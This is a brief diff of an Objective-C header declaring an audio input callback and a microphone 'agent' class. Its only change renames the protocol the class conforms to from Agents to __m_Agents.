@@ -39,7 +39,7 @@ void myInputAudioCallback(void                               *inUserData,
                           UInt32                             inNumPackets,
                           const AudioStreamPacketDescription *inPacketDescs);
 
-@interface __m_MAgentMicrophone : NSObject <Agents>
+@interface __m_MAgentMicrophone : NSObject <__m_Agents>
 {
 @private
   NSMutableDictionary         *mAgentConfiguration;
